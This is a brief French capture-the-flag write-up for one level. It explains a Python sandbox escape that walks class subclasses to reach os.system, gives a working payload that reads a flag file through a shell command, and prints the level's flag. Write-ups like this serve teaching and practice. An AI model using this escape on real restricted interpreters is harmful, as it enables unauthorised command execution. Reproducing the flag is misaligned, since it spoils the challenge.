# Level 07 → Level 08

**Mot de passe du niveau :** flag de `level06`

## Vulnérabilité
Sandbox Python trop permissive : on dispose d'un contexte d'évaluation Python
restreint mais sans blocage de l'introspection. On remonte la hiérarchie des
classes (`().__class__.__base__.__subclasses__()`) pour retrouver `os._wrap_close`
et récupérer `os.system` via ses `__globals__` — un « Python sandbox escape »
classique.

## Exploitation
```python
subs = ().__class__.__base__.__subclasses__()
i = str(subs).split(", ").index("<class 'os._wrap_close'>")
subs[i].__init__.__globals__["system"]("cat /home/flag07/.flag")
```
Voir `ressource/exploit.sh`.

## Flag
```
fiumuikeil8rung8ahcuiperb
```
